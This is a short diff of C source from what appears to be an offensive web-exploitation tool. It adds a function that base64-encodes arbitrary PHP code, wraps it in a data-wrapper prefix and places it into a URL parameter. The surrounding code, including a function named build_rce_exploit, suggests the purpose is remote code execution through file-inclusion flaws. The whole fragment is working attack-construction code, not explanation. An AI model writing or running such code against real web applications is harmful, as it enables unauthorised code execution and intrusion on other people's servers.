@@ -132,6 +132,25 @@ void build_rce_exploit(CURL *curl, const char *php_code, rce_type tech, GET_DATA
     }
 }
 
+char *build_datawrap_url(const char *base, struct parameter_list *plist, int p, const char *phpcode){
+    char *b64, *xpl, *ret;
+    size_t b64_len;
+
+    b64 = b64_encode(phpcode);
+    b64_len = strlen(b64);
+
+    xpl = xmalloc(b64_len + DATAWRAPLEN + 1);
+
+    memcpy(xpl, DATA_WRAP, DATAWRAPLEN);
+    memcpy(xpl+DATAWRAPLEN, b64, b64_len);
+    xpl[b64_len+DATAWRAPLEN] = 0x0;
+
+    ret = build_url(base, plist, p, xpl, replace_string);
+
+    free(b64);
+    free(xpl);
+    return ret;
+}
 
 bool check_error(const char *body){
     bool ret = false;
